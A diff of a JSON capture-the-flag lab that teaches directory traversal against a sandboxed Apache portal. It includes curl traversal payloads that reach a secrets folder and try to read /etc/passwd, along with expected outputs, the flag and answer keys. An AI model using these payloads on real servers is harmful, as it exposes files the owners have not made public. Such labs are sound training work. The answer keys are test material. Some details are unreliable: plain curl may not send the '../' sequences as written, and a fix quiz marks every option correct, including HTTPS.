@@ -1,23 +1,24 @@
 {
-  "title": "Directory Traversal Vulnerability",
-  "description": "Learn to exploit path traversal vulnerabilities to access files outside the intended web root directory.",
+  "title": "Directory Traversal — Escaping the Web Root",
+  "description": "Exploit a path traversal vulnerability in an Apache web server to escape the intended document directory, locate a hidden secrets folder, and read a flag file the developers assumed was unreachable.",
   "prerequisites": [],
   "outcomes": [
-    "Understand how web applications can be vulnerable to directory traversal via unvalidated path inputs.",
-    "Use ../ sequences in URLs to navigate outside the intended directory structure.",
-    "Retrieve files that should not be directly accessible via a web browser."
+    "Read a public document served by the target web server and understand the intended directory structure.",
+    "Identify the server-side technology from HTTP response headers.",
+    "Use ../ sequences to traverse outside the intended document root and access files in sibling directories.",
+    "Attempt to traverse to sensitive system files and understand what controls further access."
   ],
   "state": "UNRELEASED",
   "show_stepper_bar": true,
   "variant_sandboxes": false,
-  "estimated_duration": 30,
+  "estimated_duration": 40,
   "levels": [
     {
       "title": "Introduction",
       "level_type": "INFO_LEVEL",
       "order": 0,
       "estimated_duration": 0,
-      "content": "# General information — please read carefully\n\n* Each level builds on the previous. Do not skip ahead.\n* If you get stuck, use hints or Google the technique.\n* This exercise is educational. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a security researcher testing SecureHost, a file-sharing service. The company claims their web server is secure, but they have not implemented proper input validation on file paths. Your job: prove that you can read files outside the intended directory structure."
+      "content": "# General information — please read carefully\n\n* Work through the levels in order. Each level introduces one new step in the attack chain.\n* Use the hints if you are stuck. Hints cost points but are cheaper than giving up.\n* Do not attack anything outside your sandbox.\n\n# Storyline\n\nYou are a penetration tester conducting a web security assessment for **Caldwell & Webb Consulting**. The client recently launched an internal document portal on their intranet — a simple Apache web server that exposes company documents at the `/files/documents/` path for staff to read. The development team assures your project manager that the server is 'just Apache, nothing special', and that confidential files are 'in a completely different folder'.\n\nYour job is to determine whether that confidence is justified.\n\nDirectory traversal (also known as path traversal) is one of the oldest and most persistent web vulnerabilities. When a web server or application constructs a file path by appending user-supplied input to a base directory, it must carefully validate and sanitise that input. If it does not, an attacker can supply `../` sequences (dot-dot-slash) to walk up the directory tree, exiting the intended document root and reaching any file that the web server process has permission to read.\n\nThe impact ranges from disclosure of configuration files and source code to full system compromise via `/etc/passwd`, private SSH keys, or application credentials. Path traversal has been exploited in major breaches across every industry sector. It appears in the OWASP Top Ten and remains a staple of web penetration test findings.\n\nCaldwell & Webb's portal serves documents from `/var/www/html/files/documents/`. A second folder, `/var/www/html/secrets/`, sits outside the intended access path. There is no access control between them — just the assumption that users will only request files within the documents directory. That assumption is wrong.\n\nYour mission: read the public README, identify the server technology, craft a traversal payload that escapes the documents directory, locate the secrets folder, and retrieve the flag. Then determine what stops traversal from reaching operating system files."
     },
     {
       "title": "Get Access",
@@ -25,95 +26,31 @@
       "order": 1,
       "estimated_duration": 0,
       "passkey": "start",
-      "cloud_content": "SSH to your attacker machine at **10.1.30.23**, then access the target web server:\n\n```\ncurl http://10.1.30.10/files/documents/README.txt\n```\n\nThe target is at **10.1.30.10** on HTTP port 80. Do not attack outside the sandbox. Submit **start** to begin.",
-      "local_content": "Access the target web server locally:\n\n```\ncurl http://127.0.0.1/files/documents/README.txt\n```\n\nSubmit **start** to begin."
+      "cloud_content": "SSH to your attacker machine at **10.1.30.23**, then reach the target portal:\n\n```\ncurl http://10.1.30.10/files/documents/README.txt\n```\n\nThe target server is at **10.1.30.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "Reach the target portal locally:\n\n```\ncurl http://127.0.0.1/files/documents/README.txt\n```\n\nOr open http://127.0.0.1/files/documents/README.txt in a browser. Submit **start** to begin."
     },
     {
-      "title": "Discover the Traversal Vector",
+      "title": "Read the Public Document",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
-      "estimated_duration": 8,
-      "answer": "..",
+      "estimated_duration": 7,
+      "answer": "This is a public document.",
       "answer_variable_name": null,
       "variant_answers": false,
-      "content": "The SecureHost application is supposed to serve only files from `/files/documents/`. However, the URL path is passed directly to the web server without validation.\n\nDirectory traversal attacks use a special sequence to move up the directory tree. In Unix-like systems, every directory has a special name for its parent directory. What is this name?\n\nTry accessing a simple test:\n\n```\ncurl http://10.1.30.10/files/documents/README.txt\n```\n\nThen try to go up one level:\n\n```\ncurl http://10.1.30.10/files/[TRAVERSAL_SEQUENCE]/files/documents/README.txt\n```\n\nIf you see the same file content, you have successfully navigated up and back down — confirming the traversal works.\n\n**What is the special directory name used to refer to the parent directory?**",
-      "solution": "```\n$ curl http://10.1.30.10/files/documents/README.txt\nThis is a public document...\n\n$ curl http://10.1.30.10/files/../files/documents/README.txt\nThis is a public document...\n```\n\nThe sequence `..` refers to the parent directory. Using it in the path allows traversal.",
+      "content": "The portal serves documents at `/files/documents/`. Access the README file that the team placed there as a starting point:\n\n```\ncurl http://10.1.30.10/files/documents/README.txt\n```\n\nRead the full contents of the response. This establishes the baseline — what is intentionally served — before you attempt to access anything outside the intended path.\n\n**What is the first sentence in the README.txt file?** (exact text)",
+      "solution": "```\n$ curl http://10.1.30.10/files/documents/README.txt\nThis is a public document.\nIt contains no sensitive information.\n```\n\nThe first sentence is: **This is a public document.**",
       "solution_penalized": false,
       "hints": [
         {
-          "title": "What is the parent directory reference in Unix?",
-          "content": "In Unix/Linux, `..` (two dots) represents the parent directory. `../` moves up one level.",
-          "hint_penalty": 1,
-          "order": 0
-        },
-        {
-          "title": "How would you use it in a URL?",
-          "content": "If you are at `/files/documents/`, then `../` takes you to `/files/`, and `../../` takes you to `/`.",
-          "hint_penalty": 2,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 10,
-      "mitre_techniques": [
-        { "technique_key": "TA0009.T1083" }
-      ]
-    },
-    {
-      "title": "Escape the Intended Directory",
-      "level_type": "TRAINING_LEVEL",
-      "order": 3,
-      "estimated_duration": 10,
-      "answer": "secrets",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You have confirmed that `..` works to navigate the directory tree. Now use this to escape the intended `/files/documents/` directory.\n\nSecureHost has placed a `secrets/` directory next to `/files/` in the web root. It was meant to be hidden from users, but without proper access controls, you can reach it via directory traversal.\n\nFrom `/files/documents/`, you need to go up two levels (to `/`) then access the sibling directory:\n\n```\ncurl http://10.1.30.10/files/../../secrets/flag.txt\n```\n\nLook at the response — it contains a directory or file name. What is that name (without the trailing slash)?",
-      "solution": "```\n$ curl http://10.1.30.10/files/../../secrets/flag.txt\nWMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}\n```\n\nThe directory we escaped into is **secrets**.",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "How many levels up do you need to go?",
-          "content": "From `/files/documents/` you need to go up 2 levels to reach `/`. That means `../../`.",
-          "hint_penalty": 3,
-          "order": 0
-        },
-        {
-          "title": "What path should you construct?",
-          "content": "Start with `/files/`, then add `../../secrets/` to escape and access the sibling directory.",
+          "title": "How to access the file",
+          "content": "Run: curl http://10.1.30.10/files/documents/README.txt. The response will contain the full text of the file. The first sentence is on the first line.",
           "hint_penalty": 5,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 25,
-      "mitre_techniques": [
-        { "technique_key": "TA0009.T1083" }
-      ]
-    },
-    {
-      "title": "Retrieve the Flag",
-      "level_type": "TRAINING_LEVEL",
-      "order": 4,
-      "estimated_duration": 5,
-      "answer": "WMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You have escaped the intended directory structure. Now retrieve the flag file from the secrets directory.\n\nRun:\n\n```\ncurl http://10.1.30.10/files/../../secrets/flag.txt\n```\n\nThe entire response is the flag — a string starting with `WMG{` and ending with `}`.\n\nIn a real engagement, this same technique could expose configuration files, private keys, database backups, or any other file the web server process can read.\n\n**Submit the flag from the response.**",
-      "solution": "```\n$ curl http://10.1.30.10/files/../../secrets/flag.txt\nWMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}\n```",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "What is the exact URL?",
-          "content": "Use the same URL pattern from the previous level: `/files/../../secrets/flag.txt`",
-          "hint_penalty": 10,
           "order": 0
         },
         {
-          "title": "What format is the flag?",
-          "content": "The flag starts with `WMG{` and ends with `}`.",
-          "hint_penalty": 20,
+          "title": "The first sentence",
+          "content": "The README begins: This is a public document. — submit that exact phrase.",
+          "hint_penalty": 10,
           "order": 1
         }
       ],
@@ -121,20 +58,210 @@
       "attachments": [],
       "max_score": 50,
       "mitre_techniques": [
-        { "technique_key": "TA0009.T1083" }
+        { "technique_key": "TA0043.T1595" }
+      ]
+    },
+    {
+      "title": "Fingerprint the Web Server",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 7,
+      "answer": "Apache",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Before attempting traversal, fingerprint the web server technology. HTTP response headers often reveal the server software name and version.\n\nFetch the HTTP headers for the README:\n\n```\ncurl -I http://10.1.30.10/files/documents/README.txt\n```\n\nLook at the `Server:` header. It identifies the HTTP server software. Knowing the server is important: Apache, Nginx, and IIS each handle path traversal attempts differently, and each has known CVEs at specific versions.\n\n**What is the name of the web server software shown in the Server header?** (one word)",
+      "solution": "```\n$ curl -I http://10.1.30.10/files/documents/README.txt\nHTTP/1.1 200 OK\nDate: ...\nServer: Apache/2.4.57 (Ubuntu)\nContent-Type: text/plain\n```\n\nThe server is **Apache**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to see HTTP headers",
+          "content": "Use curl -I http://10.1.30.10/files/documents/README.txt. The -I flag sends a HEAD request and returns only the headers.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Which header to look at",
+          "content": "Find the 'Server:' header in the output. It will read: Server: Apache/2.4.x (Ubuntu). The answer is the first word: Apache.",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The web server is Apache.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0043.T1592" }
+      ]
+    },
+    {
+      "title": "Understand Path Traversal",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 8,
+      "answer": "..",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Directory traversal exploits a single key sequence: `..` (dot-dot). In every operating system, `..` means 'the parent directory'. When a URL includes `../`, the server should either resolve it safely (rejecting the request or canonicalising the path) or it will physically traverse to the parent.\n\nTest traversal from the documents directory. The structure on the server is:\n\n```\n/var/www/html/\n  files/\n    documents/       ← intended access point\n  secrets/           ← should not be reachable\n```\n\nTo move from `/files/documents/` to `/files/`, add one `../`. To move to `/` (the web root), add another. Try accessing a path that traverses upward:\n\n```\ncurl http://10.1.30.10/files/documents/../../\n```\n\nYou should see a directory listing of the web root. Notice that the URL contains two instances of `..` — each one steps up one directory level.\n\n**What two-character sequence is used to step up one directory level in a path traversal attack?**",
+      "solution": "The two-character sequence is **..** (two dots). In a URL, `../` means 'go to the parent directory'. Chaining multiple `../../../` sequences allows an attacker to walk arbitrarily far up the directory tree.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What does .. mean in a file path?",
+          "content": "In all operating systems, .. (two dots) means the parent directory. On the command line, cd .. moves you one directory level up. The same works in URLs on vulnerable web servers.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What sequence to submit",
+          "content": "The answer is simply two dots: .. — no slashes, no spaces. It is the fundamental traversal primitive.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The two-character sequence is .. (dot dot).",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1083" }
+      ]
+    },
+    {
+      "title": "Locate the Hidden Directory",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 8,
+      "answer": "secrets",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You can now traverse the directory tree. Use traversal to list the web root directory — the top level that Apache serves. This reveals any sibling directories alongside `/files/`:\n\n```\ncurl http://10.1.30.10/files/documents/../../\n```\n\nIn the directory listing look for folders other than `files/`. There is a directory there that was meant to be inaccessible. Its name is the answer.\n\nIn a real engagement this is the reconnaissance step: confirm the traversal works, list what directories exist, then target the sensitive ones.\n\n**What is the name of the hidden directory visible in the web root listing?**",
+      "solution": "```\n$ curl http://10.1.30.10/files/documents/../../\n...\n<a href=\"files/\">files/</a>\n<a href=\"secrets/\">secrets/</a>\n...\n```\n\nThe hidden directory is **secrets**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to list the web root",
+          "content": "Run: curl http://10.1.30.10/files/documents/../../. This traverses two levels up from documents/ to the web root (/var/www/html/) and lists its contents.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What to look for in the listing",
+          "content": "The web root contains two directories: files/ and one other. The other directory — not publicly linked — is the hidden one. Its name is your answer.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The hidden directory name",
+          "content": "The hidden directory is called: secrets",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1083" }
+      ]
+    },
+    {
+      "title": "Retrieve the Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 8,
+      "answer": "WMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have located the `secrets/` directory. Now retrieve the flag file inside it using a traversal path:\n\n```\ncurl http://10.1.30.10/files/documents/../../secrets/flag.txt\n```\n\nBreaking down the path:\n- `/files/documents/` — start at the intended document root\n- `../../` — traverse up two levels to the web root\n- `secrets/flag.txt` — enter the hidden directory and read the flag\n\nThe flag file has the same permissions as any other file served by Apache. The only thing that protected it was its location outside the intended directory — a protection that `../` completely bypasses.\n\n**Submit the flag from the secrets/flag.txt file.**",
+      "solution": "```\n$ curl http://10.1.30.10/files/documents/../../secrets/flag.txt\nWMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to construct the traversal URL",
+          "content": "Start from the documents directory and add ../../secrets/flag.txt to traverse to the secrets folder: curl http://10.1.30.10/files/documents/../../secrets/flag.txt",
+          "hint_penalty": 20,
+          "order": 0
+        },
+        {
+          "title": "What the flag looks like",
+          "content": "The flag starts with WMG{ and ends with }. It appears directly in the HTTP response body when you access the file.",
+          "hint_penalty": 30,
+          "order": 1
+        },
+        {
+          "title": "Full command",
+          "content": "curl http://10.1.30.10/files/documents/../../secrets/flag.txt",
+          "hint_penalty": 40,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 150,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1005" }
+      ]
+    },
+    {
+      "title": "Attempt System File Access",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 8,
+      "answer": "403",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have successfully traversed from `/files/documents/` into `/secrets/`. The question now is: how far can you go? Try to traverse all the way out of the web root and into operating system files:\n\n```\ncurl -I http://10.1.30.10/files/documents/../../../../../etc/passwd\n```\n\nLook at the HTTP status code in the response. A `200 OK` would mean the file was served. A `403 Forbidden` means Apache blocked the request. A `404 Not Found` means the path did not resolve.\n\nThe status code tells you what access control Apache has in place at the OS boundary. This is an important step in a real assessment: determine the exact scope of what traversal can reach.\n\n**What HTTP status code does Apache return when you try to access /etc/passwd via traversal?**",
+      "solution": "```\n$ curl -I http://10.1.30.10/files/documents/../../../../../etc/passwd\nHTTP/1.1 403 Forbidden\n```\n\nApache returns **403** — it prevents access to files outside the web root entirely.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to check the HTTP status code",
+          "content": "Use curl -I to fetch only the headers. The first line of the response shows the HTTP status code, e.g. 'HTTP/1.1 403 Forbidden'.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What status code to expect",
+          "content": "Apache's default configuration blocks access to files outside the web root. The server returns a 403 Forbidden status when you try to escape /var/www/html/.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The HTTP status code is 403.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1083" }
       ]
     },
     {
       "title": "Feedback",
       "level_type": "ASSESSMENT_LEVEL",
-      "order": 5,
+      "order": 8,
       "estimated_duration": 5,
       "assessment_type": "QUESTIONNAIRE",
-      "instructions": "Help us improve this game.",
+      "instructions": "Please answer these questions to help us improve this game.",
       "questions": [
         {
           "question_type": "MCQ",
-          "text": "How difficult was this game?",
+          "text": "How difficult did you find this game?",
           "points": 0,
           "penalty": 0,
           "order": 0,
@@ -147,37 +274,51 @@
         },
         {
           "question_type": "MCQ",
-          "text": "Had you encountered directory traversal before?",
+          "text": "Before this game, were you familiar with directory traversal attacks?",
           "points": 0,
           "penalty": 0,
           "order": 1,
           "answer_required": true,
           "choices": [
-            { "text": "Yes, I knew about it",       "correct": true, "order": 0 },
-            { "text": "I had heard of it",        "correct": true, "order": 1 },
-            { "text": "No, this was new to me",   "correct": true, "order": 2 }
+            { "text": "Yes, I had exploited them before",      "correct": true, "order": 0 },
+            { "text": "I knew about them but had not tried",   "correct": true, "order": 1 },
+            { "text": "No, this was completely new to me",     "correct": true, "order": 2 }
           ]
         },
         {
           "question_type": "MCQ",
-          "text": "How clear were the instructions?",
+          "text": "How clear were the level instructions?",
           "points": 0,
           "penalty": 0,
           "order": 2,
           "answer_required": true,
           "choices": [
-            { "text": "Very clear",         "correct": true, "order": 0 },
-            { "text": "Mostly clear",        "correct": true, "order": 1 },
-            { "text": "Confusing at times",  "correct": true, "order": 2 },
-            { "text": "Hard to follow",      "correct": true, "order": 3 }
+            { "text": "Very clear",        "correct": true, "order": 0 },
+            { "text": "Mostly clear",       "correct": true, "order": 1 },
+            { "text": "Confusing at times", "correct": true, "order": 2 },
+            { "text": "Hard to follow",     "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "What is the correct fix for a directory traversal vulnerability?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": true,
+          "choices": [
+            { "text": "Canonicalise and validate file paths before opening them",  "correct": true, "order": 0 },
+            { "text": "Hide sensitive files in deeper sub-directories",             "correct": true, "order": 1 },
+            { "text": "Disable directory listings in Apache",                       "correct": true, "order": 2 },
+            { "text": "Use HTTPS instead of HTTP",                                  "correct": true, "order": 3 }
           ]
         },
         {
           "question_type": "FFQ",
-          "text": "What would you improve?",
+          "text": "What would you change or add to improve this game?",
           "points": 0,
           "penalty": 0,
-          "order": 3,
+          "order": 4,
           "answer_required": false,
           "choices": []
         }
